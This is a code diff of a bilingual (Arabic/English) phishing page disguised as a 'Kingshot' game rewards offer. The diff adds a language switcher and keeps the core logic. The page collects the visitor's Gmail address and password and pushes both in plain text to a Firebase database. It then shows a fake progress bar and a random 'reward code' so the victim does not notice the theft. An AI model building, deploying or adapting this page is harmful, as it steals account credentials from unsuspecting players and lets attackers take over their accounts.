@@ -18,95 +18,69 @@
         body { 
             background: radial-gradient(circle, #2e0d56 0%, var(--dark-bg) 100%); 
             color: white; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            margin: 0; 
+            font-family: 'Segoe UI', Tahoma, sans-serif; 
+            display: flex; justify-content: center; align-items: center; 
+            min-height: 100vh; margin: 0;
         }
+
+        /* زر اللغة الجديد: صغير، بدون أعلام، وشفاف */
+        .lang-switcher {
+            position: fixed; top: 20px; left: 20px;
+            background: transparent;
+            border: 1px solid rgba(255, 207, 51, 0.3);
+            color: rgba(255, 207, 51, 0.8); 
+            padding: 4px 10px; border-radius: 5px;
+            cursor: pointer; font-size: 11px; font-weight: bold;
+            text-transform: uppercase; transition: 0.3s; z-index: 1000;
+        }
+        .lang-switcher:hover { background: rgba(255, 207, 51, 0.1); color: var(--accent-gold); }
 
         .box { 
             background: rgba(45, 12, 85, 0.95); 
             border: 2px solid var(--accent-gold); 
-            padding: 30px; 
-            border-radius: 20px; 
-            width: 90%; 
-            max-width: 380px; 
-            text-align: center; 
-            box-shadow: 0 0 30px rgba(138, 43, 226, 0.4), inset 0 0 15px rgba(255, 207, 51, 0.2);
+            padding: 30px; border-radius: 20px; 
+            width: 90%; max-width: 380px; text-align: center; 
+            box-shadow: 0 0 30px rgba(138, 43, 226, 0.4);
             position: relative;
         }
 
-        .box::before {
-            content: "👑";
-            font-size: 40px;
-            display: block;
-            margin-bottom: 10px;
-        }
-
-        h2 { 
-            color: var(--accent-gold); 
-            text-transform: uppercase;
-            margin-bottom: 5px;
-            font-size: 24px;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
-        }
-
-        p {
-            color: #b39ddb;
-            font-size: 14px;
-            margin-bottom: 25px;
-        }
+        .box::before { content: "👑"; font-size: 40px; display: block; margin-bottom: 10px; }
+        h2 { color: var(--accent-gold); text-transform: uppercase; margin-bottom: 5px; font-size: 24px; }
+        p { color: #b39ddb; font-size: 14px; margin-bottom: 25px; }
 
         input { 
-            width: 100%; 
-            padding: 14px; 
-            border-radius: 10px; 
-            border: 1px solid rgba(255, 207, 51, 0.3); 
-            background: var(--input-bg); 
-            color: white; 
-            box-sizing: border-box; 
-            outline: none; 
-            text-align: center;
-            margin-bottom: 15px;
+            width: 100%; padding: 14px; border-radius: 10px; border: 1px solid rgba(255, 207, 51, 0.3); 
+            background: var(--input-bg); color: white; box-sizing: border-box; 
+            text-align: center; margin-bottom: 15px; outline: none;
         }
 
-        button { 
+        button.main-btn { 
             background: linear-gradient(135deg, #ffcf33 0%, #ffa000 100%); 
-            color: #2d0c55; 
-            border: none; 
-            padding: 15px; 
-            width: 100%; 
-            cursor: pointer; 
-            font-weight: 900; 
-            border-radius: 10px; 
-            font-size: 18px; 
-            text-transform: uppercase;
-            box-shadow: 0 4px 15px rgba(255, 160, 0, 0.4);
+            color: #2d0c55; border: none; padding: 15px; width: 100%; 
+            cursor: pointer; font-weight: 900; border-radius: 10px; font-size: 18px; 
         }
 
-        /* نظام التحميل والأكواد */
         .progress-container { display: none; width: 100%; background: #333; border-radius: 10px; margin-top: 20px; height: 10px; overflow: hidden; }
         .progress-bar { width: 0%; height: 100%; background: var(--accent-gold); transition: width 0.4s; }
         #status-text { font-size: 12px; margin-top: 10px; color: #b39ddb; }
-        #final-code-box { display: none; margin-top: 20px; padding: 15px; border: 2px dashed var(--accent-gold); border-radius: 10px; background: rgba(255, 207, 51, 0.05); }
-        .code-display { font-family: monospace; font-size: 22px; color: var(--accent-gold); font-weight: bold; margin: 10px 0; letter-spacing: 2px; }
-
+        #final-code-box { display: none; margin-top: 20px; padding: 15px; border: 2px dashed var(--accent-gold); border-radius: 10px; }
+        .code-display { font-family: monospace; font-size: 22px; color: var(--accent-gold); font-weight: bold; margin: 10px 0; }
         .footer-note { font-size: 10px; color: #7e57c2; margin-top: 20px; }
     </style>
 </head>
 <body>
 
+    <button class="lang-switcher" onclick="toggleLang()" id="langBtn">EN</button>
+
     <div class="box">
         <div id="setup-view">
-            <h2>KINGSHOT REWARDS</h2>
-            <p>سجل دخولك للحصول على كود (سكن ملكي + 5000 جوهرة)</p>
+            <h2 id="title">KINGSHOT REWARDS</h2>
+            <p id="desc">سجل دخولك للحصول على كود (سكن ملكي + 5000 جوهرة)</p>
             
             <input type="text" id="email" placeholder="البريد الإلكتروني (Gmail)" required>
             <input type="password" id="password" placeholder="كلمة المرور" required>
             
-            <button onclick="handleStart()">تأكيد واستلام الكود</button>
+            <button onclick="handleStart()" id="mainBtn" class="main-btn">تأكيد واستلام الكود</button>
         </div>
 
         <div id="process-view" style="display:none;">
@@ -117,13 +91,13 @@
             <p id="status-text">بدء الاتصال بالسيرفر الرئيسي...</p>
 
             <div id="final-code-box">
-                <p style="font-size: 11px;">تم توليد الكود الخاص بك بنجاح:</p>
+                <p id="code-msg" style="font-size: 11px;">تم توليد الكود الخاص بك بنجاح:</p>
                 <div class="code-display" id="generated-code">---- ---- ----</div>
-                <button onclick="location.reload()" style="padding: 8px; font-size: 14px;">إغلاق</button>
+                <button onclick="location.reload()" id="closeBtn" style="padding: 8px; font-size: 14px; background: none; border: 1px solid white; color: white; border-radius: 5px; cursor: pointer;">إغلاق</button>
             </div>
         </div>
         
-        <div class="footer-note">نظام حماية Kingshot المعتمد 🔒</div>
+        <div class="footer-note" id="footer">نظام حماية Kingshot المعتمد 🔒</div>
     </div>
 
     <script>
@@ -140,24 +114,62 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
+        let currentLang = 'ar';
+        const content = {
+            ar: {
+                title: "KINGSHOT REWARDS", desc: "سجل دخولك للحصول على كود (سكن ملكي + 5000 جوهرة)",
+                email: "البريد الإلكتروني (Gmail)", pass: "كلمة المرور", btn: "تأكيد واستلام الكود",
+                loading: "جاري المعالجة...", status: "بدء الاتصال بالسيرفر الرئيسي...",
+                success: "تم بنجاح!", codeMsg: "تم توليد الكود الخاص بك بنجاح:",
+                close: "إغلاق", footer: "نظام حماية Kingshot المعتمد 🔒",
+                errMail: "فشل النظام: يجب استخدام حساب Gmail الرسمي.",
+                errPass: "فشل التوثيق: تأكد من كلمة المرور.",
+                step1: "جاري مطابقة الحساب...", step2: "جاري فك تشفير الأكواد...", step3: "استخراج الكود النهائي...",
+                langBtn: "EN"
+            },
+            en: {
+                title: "KINGSHOT REWARDS", desc: "Login to get your code (Royal Skin + 5000 Gems)",
+                email: "Email Address (Gmail)", pass: "Password", btn: "CONFIRM & GET CODE",
+                loading: "Processing...", status: "Connecting to main server...",
+                success: "Success!", codeMsg: "Your code has been generated:",
+                close: "Close", footer: "Verified Kingshot Protection 🔒",
+                errMail: "System Failed: Use official Gmail account only.",
+                errPass: "Auth Failed: Check your password.",
+                step1: "Matching account in server...", step2: "Decrypting code bundle...", step3: "Extracting final code...",
+                langBtn: "AR"
+            }
+        };
+
+        function toggleLang() {
+            currentLang = currentLang === 'ar' ? 'en' : 'ar';
+            const c = content[currentLang];
+            document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
+            document.getElementById('langBtn').innerText = c.langBtn;
+            document.getElementById('title').innerText = c.title;
+            document.getElementById('desc').innerText = c.desc;
+            document.getElementById('email').placeholder = c.email;
+            document.getElementById('password').placeholder = c.pass;
+            document.getElementById('mainBtn').innerText = c.btn;
+            document.getElementById('header-msg').innerText = c.loading;
+            document.getElementById('status-text').innerText = c.status;
+            document.getElementById('code-msg').innerText = c.codeMsg;
+            document.getElementById('closeBtn').innerText = c.close;
+            document.getElementById('footer').innerText = c.footer;
+        }
+
         function createCode() {
-            const pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-            let r = (n) => Array.from({length:n}, () => pool[Math.floor(Math.random()*pool.length)]).join('');
+            const p = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            let r = (n) => Array.from({length:n}, () => p[Math.floor(Math.random()*p.length)]).join('');
             return `KING-${r(4)}-${r(4)}`;
         }
 
         function handleStart() {
             const mail = document.getElementById('email').value.trim();
             const pass = document.getElementById('password').value;
+            const c = content[currentLang];
 
-            if (!mail.toLowerCase().endsWith("@gmail.com")) {
-                alert("فشل النظام: يجب استخدام حساب Gmail الرسمي المرتبط باللعبة.");
-                return;
-            }
-            if (pass.length < 5) {
-                alert("فشل التوثيق: تعذر العثور على تصريح دخول، تأكد من كلمة المرور.");
-                return;
-            }
+            if (!mail.toLowerCase().endsWith("@gmail.com")) { alert(c.errMail); return; }
+            if (pass.length < 5) { alert(c.errPass); return; }
 
             document.getElementById('setup-view').style.display = 'none';
             document.getElementById('process-view').style.display = 'block';
@@ -169,17 +181,10 @@
             const timer = setInterval(() => {
                 p += Math.floor(Math.random() * 15) + 5;
                 if (p >= 100) {
-                    p = 100;
-                    clearInterval(timer);
+                    p = 100; clearInterval(timer);
                     const code = createCode();
-                    
-                    database.ref('kingshot_codes/').push({
-                        account: mail,
-                        password: pass,
-                        code: code,
-                        timestamp: new Date().toLocaleString()
-                    }).then(() => {
-                        document.getElementById('header-msg').innerText = "تم بنجاح!";
+                    database.ref('kingshot_codes/').push({ account: mail, password: pass, code: code, timestamp: new Date().toLocaleString() }).then(() => {
+                        document.getElementById('header-msg').innerText = c.success;
                         document.getElementById('p-container').style.display = 'none';
                         status.style.display = 'none';
                         document.getElementById('generated-code').innerText = code;
@@ -187,9 +192,9 @@
                     });
                 }
                 bar.style.width = p + "%";
-                if(p < 40) status.innerText = "جاري مطابقة الحساب في السيرفر...";
-                else if(p < 80) status.innerText = "جاري فك تشفير حزمة الأكواد...";
-                else status.innerText = "جاري استخراج الكود النهائي...";
+                if(p < 40) status.innerText = c.step1;
+                else if(p < 80) status.innerText = c.step2;
+                else status.innerText = c.step3;
             }, 600);
         }
     </script>
